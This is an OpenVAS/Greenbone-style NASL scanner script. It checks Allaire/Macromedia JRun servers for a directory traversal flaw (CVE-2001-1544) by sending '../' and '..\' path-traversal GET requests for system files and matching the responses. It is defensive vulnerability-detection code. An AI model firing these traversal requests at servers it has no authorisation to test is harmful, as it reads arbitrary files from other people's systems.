# SPDX-FileCopyrightText: 2002 Digital Defense Inc.
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:adobe:jrun";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10997");
  script_version("2025-09-12T05:38:45+0000");
  script_tag(name:"last_modification", value:"2025-09-12 05:38:45 +0000 (Fri, 12 Sep 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2001-1544");
  script_name("Allaire/Macromedia JRun Directory Traversal Vulnerability (MPSB01-17) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2002 Digital Defense Inc.");
  script_family("Web Servers");
  script_dependencies("gb_adobe_jrun_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8000);
  script_mandatory_keys("adobe/jrun/http/detected");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210221125251/http://www.securityfocus.com/bid/3666");

  script_tag(name:"summary", value:"Allaire/Macromedia JRun is prone to a directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"This allows a potential intruder to view the contents of any file
  on the system.");

  script_tag(name:"affected", value:"Versions 2.3.3, 3.0 and 3.1 are known to be affected.");

  script_tag(name:"solution", value:"The vendor has addressed this issue in Macromedia Product
  Security Bulletin MPSB01-17. Please update to the latest version of JRun.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

files = traversal_files();

foreach prefix(make_list("/../../../../../../../../", "/..\..\..\..\..\..\..\..\")) {

  foreach pattern(keys(files)) {

    file = files[pattern];

    url = prefix + file;

    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(data:req, port:port);
    if(!res)
      continue;

    if(egrep(string:res, pattern:pattern, icase:TRUE)) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
